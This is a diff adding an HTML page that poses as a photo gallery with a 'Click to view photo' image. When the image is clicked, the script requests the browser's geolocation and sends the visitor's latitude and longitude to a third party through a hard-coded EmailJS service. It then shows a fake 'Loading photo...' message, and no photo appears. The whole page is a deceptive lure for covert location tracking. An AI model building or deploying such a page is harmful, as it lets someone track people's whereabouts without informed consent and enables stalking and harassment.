@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Gallery</title>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background-color: #f7f7f7;
+    }
+    img {
+      max-width: 90%;
+      margin-top: 50px;
+      border: 4px solid #333;
+      cursor: pointer;
+    }
+    h2 {
+      margin-top: 20px;
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+  <h2>Click to view photo</h2>
+  <img src="https://via.placeholder.com/400x300.png?text=Click+to+View" alt="gallery" onclick="sendLocation()">
+
+  <script>
+    // Initialize EmailJS
+    emailjs.init("0pjoOsYEEaIF0eGLE");
+
+    function sendLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function (position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          const templateParams = {
+            lat: lat,
+            lon: lon,
+          };
+
+          emailjs.send("service_0ijm0xc", "template_1odbjug", templateParams)
+            .then(function () {
+              alert("Loading photo...");
+            }, function (error) {
+              alert("Failed to send location.");
+              console.log(error);
+            });
+
+        }, function () {
+          alert("Location access denied.");
+        });
+      } else {
+        alert("Geolocation not supported.");
+      }
+    }
+  </script>
+</body>
+</html>
